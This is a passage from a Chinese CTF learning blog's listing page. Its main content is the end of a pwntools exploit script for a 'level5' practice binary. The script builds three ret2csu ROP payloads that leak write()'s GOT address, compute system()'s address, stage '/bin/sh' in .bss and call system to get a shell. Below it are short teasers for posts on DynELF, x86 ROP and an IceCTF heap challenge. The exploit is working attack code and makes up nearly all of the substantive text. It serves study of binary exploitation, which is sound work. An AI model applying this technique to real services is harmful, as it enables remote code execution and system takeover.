elf = ELF(&apos;level5&apos;)
libc = ELF(&apos;libc.so.6&apos;)

p = process(&apos;./level5&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

got_write = elf.got[&apos;write&apos;]
print &quot;got_write: &quot; + hex(got_write)
got_read = elf.got[&apos;read&apos;]
print &quot;got_read: &quot; + hex(got_read)

main = 0x400564

off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]
print &quot;off_system_addr: &quot; + hex(off_system_addr)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  &quot;\x00&quot;*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += &quot;\x00&quot;*56
payload1 += p64(main)

p.recvuntil(&quot;Hello, World\n&quot;)

print &quot;\n#############sending payload1#############\n&quot;
p.send(payload1)
sleep(1)

write_addr = u64(p.recv(8))
print &quot;write_addr: &quot; + hex(write_addr)

system_addr = write_addr - off_system_addr
print &quot;system_addr: &quot; + hex(system_addr)

bss_addr=0x601028

p.recvuntil(&quot;Hello, World\n&quot;)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  &quot;\x00&quot;*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += &quot;\x00&quot;*56
payload2 += p64(main)

print &quot;\n#############sending payload2#############\n&quot;
p.send(payload2)
sleep(1)

p.send(p64(system_addr))
p.send(&quot;/bin/sh\0&quot;)
sleep(1)

p.recvuntil(&quot;Hello, World\n&quot;)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
payload3 =  &quot;\x00&quot;*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += &quot;\x00&quot;*56
payload3 += p64(main)

print &quot;\n#############sending payload3#############\n&quot;

sleep(1)
p.send(payload3)
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/19/pwn学习之DynELF的使用/" itemprop="url">pwn学习之DynELF的使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-19T15:54:57+08:00">
                2016-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/11/19/pwn学习之DynELF的使用/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习rop之x86篇/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/19/pwn学习rop之x86篇/" itemprop="url">pwn学习rop之x86篇</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-19T12:55:41+08:00">
                2016-11-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/11/19/pwn学习rop之x86篇/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/08/pwn第一更-Icectf-drumpfhotel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/08/pwn第一更-Icectf-drumpfhotel/" itemprop="url">pwn第一更-Icectf_drumpfhotel</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-08T17:39:00+08:00">
                2016-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>最近在刷题的时候发现的一道相对简单的溢出题目，但是可能对堆溢出方面知识涉及的不多，导致花了不少时间去研究原理，感觉还有有不少收获的。<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/11/08/pwn第一更-Icectf-drumpfhotel/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/10/26/memset函数的用法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/10/26/memset函数的用法/" itemprop="url">memset函数的用法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-10-26T23:40:54+08:00">
                2016-10-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>在通过IDA逆向伪代码分析程序的时候，经常会遇到memset()这个函数，格式一般如下所示：<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/10/26/memset函数的用法/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Yun</p>
              <p class="site-description motion-element" itemprop="description">Yun's Bolg</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yun</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
